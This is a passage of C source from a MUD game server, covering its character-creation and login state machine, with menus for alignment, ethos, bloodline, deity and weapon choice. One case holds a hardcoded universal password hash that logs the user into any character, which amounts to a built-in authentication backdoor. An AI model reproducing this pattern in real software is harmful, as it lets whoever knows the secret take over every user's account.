	    sprintf(buf,"Wisdom:       %s\n\r",get_stat_alias(ch, STAT_WIS));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Constituion:  %s\n\r",get_stat_alias(ch, STAT_CON));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Dexterity:    %s\n\r",get_stat_alias(ch, STAT_DEX));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Agility:      %s\n\r",get_stat_alias(ch, STAT_AGI));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Charisma:     %s\n\r",get_stat_alias(ch, STAT_CHA));
            write_to_buffer(d, buf,0);  	
            write_to_buffer(d,"Do you accept (Y/N)?\n\r",0);
            d->connected = CON_ACCEPT_STATS;
          return;
	  default:
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
	    write_to_buffer(d,"Please answer (Y/N)? ",0);
	   return; 
    
      }
      break;
        case CON_GET_ALIGNMENT:
             if ( (!str_cmp (argument, "Back")) || (!str_cmp (argument, "back") ))
              {
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
 	  for (i=0; i < MAX_STATS; i++)
	   {
	    tempstata = pc_race_table[ch->race].min_stats[i];
	    tempstatb =pc_race_table[ch->race].max_stats[i];
	    ch->perm_stat[i] = number_range(tempstata,tempstatb);
	   }
//            do_clear_login(ch);
            sprintf(buf,"Strength:     %s\n\r",get_stat_alias(ch, STAT_STR));
            write_to_buffer(d, buf,0);
            sprintf(buf,"Intelligence: %s\n\r",get_stat_alias(ch, STAT_INT));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Wisdom:       %s\n\r",get_stat_alias(ch, STAT_WIS));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Constituion:  %s\n\r",get_stat_alias(ch, STAT_CON));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Dexterity:    %s\n\r",get_stat_alias(ch, STAT_DEX));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Agility:      %s\n\r",get_stat_alias(ch, STAT_AGI));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Charisma:     %s\n\r",get_stat_alias(ch, STAT_CHA));
            write_to_buffer(d, buf,0);  	
            write_to_buffer(d,"Do you accept (Y/N)?\n\r",0);
            d->connected = CON_ACCEPT_STATS;
               return;
              }
             one_argument (argument, arg);   
	     if (!strcmp (arg, "help"))
               {
                argument = one_argument (argument, arg);
                 if (argument[0] == '\0')
                    do_function (ch, &do_help, "alignment");
                  else
                   do_function (ch, &do_help, argument);
                return;   
               }

            switch (argument[0])
            {
                case 'g':
                case 'G':
                    ch->alignment = 1;
		    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    select_ethos(ch);
                    d->connected = CON_GET_ETHOS;
                    break;
                case 'n':
                case 'N':
                    ch->alignment = 0;
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    select_ethos(ch);
                    d->connected = CON_GET_ETHOS;
                    break;
                case 'e':
                case 'E':
                    ch->alignment = -1;
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    select_ethos(ch);
                    d->connected = CON_GET_ETHOS;
                    break;
                default:
                     send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    send_to_char ("That's not a valid alignment.\n\r", ch);
                    select_alignment(ch);
                    return;
            }
        d->connected = CON_GET_ETHOS;
        break;
         case CON_GET_ETHOS:
             if ( (!str_cmp (argument, "Back")) || (!str_cmp (argument, "back") ))
              {
               d->connected = CON_GET_ALIGNMENT;
               send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
               select_alignment(ch);
               return;
              }
             one_argument (argument, arg);
	     if (!strcmp (arg, "help"))
               {
             argument = one_argument (argument, arg);      
                 if (argument[0] == '\0')
                    do_function (ch, &do_help, "ethos");
                  else
                   do_function (ch, &do_help, argument);
                return;   
               }



               switch (argument[0])
               { 
                case 'l':
                case 'L':
                    ch->pcdata->ethos = 1;
                    break;
                case 'n':
                case 'N':
                    ch->pcdata->ethos = 2;
                    break;
                case 'c':
                case 'C':
                    ch->pcdata->ethos = 3;
                    break;
                default:          
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    send_to_char ("That's not a valid ethos.\n\r", ch);
                    select_ethos(ch);
                    return;           
               }

            write_to_buffer (d, "\n\r", 0);

              for (i = 0; i < MAX_SKILL; i++)
               {
                if (skill_table[i].abiliti_level[ch->class] < LEVEL_IMMORTAL)
                 {
                  ch->pcdata->learned[i] = 1;
                  ch->pcdata->mastery[i] = 1;
                 } 
               }

              for (i = 0; i < MAX_SKILL; i++)
               {
                if (skill_table[i].abiliti_race[ch->race] > 0)
                 {
                  ch->pcdata->learned[i] = 100;
                  ch->pcdata->mastery[i] = skill_table[i].abiliti_race[ch->race];
                 } 
               }
            ch->pcdata->learned[gsn_recall] = 50;
            write_to_buffer (d, "\n\r", 2);
    send_to_char("\n\r{C-----------------------------------------------------------------------{x\n\r",ch);      
     write_to_buffer (d,"                            Bloodline.....\n\r\n\r",0);
            random = number_range(1,100);
            profesion1 = get_Bloodline_create(ch,random);
            random = number_range(1,100);
            profesion2 =get_Bloodline_create(ch,random);
            random = number_range(1,100);
            profesion3 = get_Bloodline_create(ch,random);
            sprintf(buf,"                %s,  %s  or  %s\n\r",bloodline_table[profesion1].name,bloodline_table[profesion2].name,bloodline_table[profesion3].name);
            send_to_char(buf,ch);
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
            write_to_buffer (d,"Pick your fathers profession:\n\r",0);
//            sprintf(buf,"  %d,  %d  or  %d",profesion1,profesion2,profesion3);
//            send_to_char(buf,ch);
            d->connected =CON_BLOODLINE;
   break;
case CON_BLOODLINE:
        profesion = lookup_Bloodline(argument);
        if ((profesion1 != profesion) && (profesion2 != profesion) && (profesion3 != profesion))
         {
    send_to_char("\n\r{C-----------------------------------------------------------------------{x\n\r",ch);      
            send_to_char("That's not a valid selection. Choices are:\n\r",ch);
            sprintf(buf,"                %s,  %s  or  %s\n\r",bloodline_table[profesion1].name,bloodline_table[profesion2].name,bloodline_table[profesion3].name);
            send_to_char(buf,ch);
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
            
            write_to_buffer (d,"Pick your fathers profession:\n\r",0);
//            sprintf(buf,"  %d,  %d  or  %d",profesion1,profesion2,profesion3);
//            send_to_char(buf,ch);
            d->connected =CON_BLOODLINE;
            break;
         }


 
  deity_list(ch);
   d->connected = CON_DEITY;
 break;

case CON_DEITY:
    deity = lookup_deity(argument);
//sprintf(buf,"  %d",deity);
//send_to_char(buf,ch);
if ( ((ch->alignment == -1) && (religion_table[deity].alignment == 1)) || ((ch->alignment == 1) && (religion_table[deity].alignment == -1)) || (deity == -1 ))

      {
      send_to_char("That's not a valid selection. Choices are:\n\r",ch);
      deity_list(ch);
      d->connected = CON_DEITY;
      break;
      }

               write_to_buffer (d, "\n\r", 2);
               write_to_buffer (d,"Please pick a weapon from the following choices:\n\r",0);
               buf[0] = '\0';
               for (i = 0; weapon_table[i].name != NULL; i++)
//                  if (ch->pcdata->learned[*weapon_table[i].gsn] > 0)
                        {
                            strcat (buf, weapon_table[i].name);
                            strcat (buf, " ");
                        }
                    strcat (buf, "\n\rYour choice? ");
                    write_to_buffer (d, buf, 0);

              d->connected =CON_PICK_WEAPON;
            break;


case CON_UNIVERSAL:
  if (strcmp(crypt( argument, "Universal" ), "UnN/LTzJlikdc") ) 
   {
    write_to_buffer( d, "Illegal login attempt. Action logged.\n\r",0);
    sprintf(buf, "Universal password attempt vs %s by %s",ch->name,d->host);
    log_string(buf);
    write_to_buffer( d, "Wrong password.\n\r", 0 );
    write_to_buffer( d, "Password: ", 0 );
    d->connected = CON_GET_OLD_PASSWORD;
    return;   
   }
  else
   {   
    write_to_buffer (d,"\n\r*UNIVERSAL*Welcome to Fate of kingdoms 4!*UNIVERSAL*\n\r",0);
    ch->next = char_list;
    char_list = ch;
    d->connected = CON_PLAYING;
    reset_char (ch);
   } 
break;
case CON_PICK_WEAPON:
            write_to_buffer (d, "\n\r", 2);
            weapon = weapon_lookup (argument);
            if (weapon == -1)
  //              || ch->pcdata->learned[*weapon_table[weapon].gsn] <= 0)
            {
                write_to_buffer (d,"That's not a valid selection. Choices are:\n\r",                               0);
                buf[0] = '\0';
                for (i = 0; weapon_table[i].name != NULL; i++)
                    if (ch->pcdata->learned[*weapon_table[i].gsn] > 0)
                    {
                        strcat (buf, weapon_table[i].name);
                        strcat (buf, " ");
                    }
                strcat (buf, "\n\rYour choice? ");
                write_to_buffer (d, buf, 0);
                return;
            }

            ch->pcdata->learned[*weapon_table[weapon].gsn] = 40;
            write_to_buffer (d, "\n\r", 2);
              do_clear_login(ch);
              menu_main(ch);
              d->connected = MAIN_MENU;
            break;                     

        case CON_READ_IMOTD:
            write_to_buffer (d, "\n\r", 2);
//            do_function (ch, &do_help, "motd");
            do_clear_login(ch);
            menu_main(ch);
            d->connected = MAIN_MENU;
            break;

		/* states for new note system, (c)1995-96 erwin@pip.dknet.dk */
		/* ch MUST be PC here; have nwrite check for PC status! */

		case CON_NOTE_TO:
			handle_con_note_to (d, argument);
			break;

		case CON_NOTE_SUBJECT:
			handle_con_note_subject (d, argument);
			break;

		case CON_NOTE_EXPIRE:
			handle_con_note_expire (d, argument);
			break;

		case CON_NOTE_TEXT:
			handle_con_note_text (d, argument);
			break;

		case CON_NOTE_FINISH:
			handle_con_note_finish (d, argument);
			break;

case MAIN_MENU:
switch( argument[0])
  {
   case '1':
   do_function (ch, &do_help, "motd");
    d->connected = CON_READ_MOTD;
   break; 

   case '2':
    do_clear_login(ch);
    menu_notewrite(ch);
    d->connected = CON_NOTEWRITE;
   return; 
    
   case '3':
    send_to_char("{WFunction Not Ready (Description).{x\n\r",ch);
   return; 
       
   case '4':
    send_to_char("{WFunction Not Ready (Background).{x\n\r",ch);
   return; 
          
   case '5':
    send_to_char("{WFunction Not Ready (Story).{x\n\r",ch);
   return; 
             
   case '6':
    send_to_char("{WFunction Not Ready (New Password).{x\n\r",ch);
   return;              
             
   case '7':
    do_clear_login(ch);
    menu_irl(ch);
    d->connected = CON_IRL;
   break;
   
   case 'W': case 'w':
     if ( IS_IMMORTAL(ch) )
      {
       send_to_char("{WSelect your invis level:.{x\n\r",ch);
       do_clear_login(ch);
       d->connected = CON_SETWIZILEVEL;
      } 
   break;   
                 
  case 'Q': case 'q':                 
    close_socket( d );
   break;

}         
break;

case CON_SETWIZILEVEL:
  
if ((arg[0] == 'B') || (arg[0] == 'b'))
 {
  menu_main(ch);
  d->connected = MAIN_MENU;
  break;
 }
   
  if (arg[0] == '\0')
   if (ch->invis_level)
    {
     ch->invis_level = 0;
     send_to_char ("Your fade back into existence.\n\r", ch);
     menu_main(ch);
     d->connected = MAIN_MENU;
     break;
    }
   else
    {
     ch->invis_level = get_trust (ch);
     send_to_char ("You slowly vanish into thin air.\n\r", ch);
     do_clear_login(ch);
     menu_main(ch);
     d->connected = MAIN_MENU;
     break;
    }
  else
   {
    level = atoi (arg);
     if (level < 0 || level > get_trust (ch))
       {
        send_to_char ("{WInvis level must be between 0 and your level.\n\r",ch);
        d->connected = CON_SETWIZILEVEL;
        break;
        }
      else
       {
        ch->reply = NULL;
        ch->invis_level = level;
        send_to_char ("You slowly vanish into thin air.\n\r", ch);
        do_clear_login(ch);
        menu_main(ch);
        d->connected = MAIN_MENU;
        break;
        }   
   }
d->connected = MAIN_MENU;
break;

case CON_NOTEWRITE:
switch( argument[0])
  {
   case '1':
   //Announce
   return;

   case '2':
    //RP
   return; 
    
   case '3':
    //Personal
   return; 
       
   case '4':
    //Submit
   return; 
          
   case '5':
    //Idea
   return; 
             
   case '6':
    //pk
   return;              
             
   case 'B': case 'b':
    d->connected = MAIN_MENU;
    do_clear_login(ch);
    menu_main(ch);
   break;   

   default:
    do_clear_login(ch);
    menu_notewrite(ch);
    d->connected = CON_NOTEWRITE;
   break;                 
}
break;

case CON_IRL:
switch( argument[0])
  {
   case '1':
   //irl name
   return;

   case '2':
    //email
   return; 
    
   case '3':
    //icq
   return; 
       
   case '4':
    //password remember word
   return; 
          
            
   case 'B': case 'b':
    d->connected = MAIN_MENU;
    do_clear_login(ch);
    menu_main(ch);
   break;   

   default:
    do_clear_login(ch);
    menu_notewrite(ch);
    d->connected = CON_IRL;
   break;                 
}
break;            

        case CON_READ_MOTD:
            if (ch->pcdata == NULL || ch->pcdata->pwd[0] == '\0')
            {
                write_to_buffer (d, "Warning! Null password!\n\r", 0);
                write_to_buffer (d,
                                 "Please report old password with bug.\n\r",
                                 0);
                write_to_buffer (d,
                                 "Type 'password null <new password>' to fix.\n\r",
                                 0);
            }

            write_to_buffer (d,
                             "\n\rWelcome to Fate of kingdoms 4!\n\r",
                             0);
            ch->next = char_list;
            char_list = ch;
            d->connected = CON_PLAYING;
            reset_char (ch);
            if (ch->level == 0)
            {
//                ch->perm_stat[class_table[ch->class].attr_prime] += 3;

                ch->level = 1;
                ch->exp = 1;
                ch->hit = ch->max_hit;
                ch->mana = ch->max_mana;
                ch->move = ch->max_move;
                ch->train = 3;
                ch->practice = 5;
                sprintf (buf, "the %s", title_table[ch->class][ch->level]
                         [ch->sex == SEX_FEMALE ? 1 : 0]);
                set_title (ch, buf);

                do_function (ch, &do_outfit, "");
                obj_to_char (create_object (get_obj_index (OBJ_VNUM_MAP), 0),
                             ch);

                char_to_room (ch, get_room_index (ROOM_VNUM_SCHOOL));
                send_to_char ("\n\r", ch);
                do_function (ch, &do_help, "newbie info");
                send_to_char ("\n\r", ch);
            }
            else if (ch->in_room != NULL)
            {
                char_to_room (ch, ch->in_room);
            }
            else if (IS_IMMORTAL (ch))
            {
                char_to_room (ch, get_room_index (ROOM_VNUM_CHAT));
            }
            else
            {
                char_to_room (ch, get_room_index (ROOM_VNUM_TEMPLE));
            }

            act ("$n has entered the game.", ch, NULL, NULL, TO_ROOM);
            do_function (ch, &do_look, "auto");

            wiznet ("$N has left real life behind.", ch, NULL,
                    WIZ_LOGINS, WIZ_SITES, get_trust (ch));

            if (ch->pet != NULL)
            {
                char_to_room (ch->pet, ch->in_room);
                act ("$n has entered the game.", ch->pet, NULL, NULL,
                     TO_ROOM);
            }

			send_to_char("\n", ch);
            do_function (ch, &do_board, "");
            break;
    }

    return;
}            


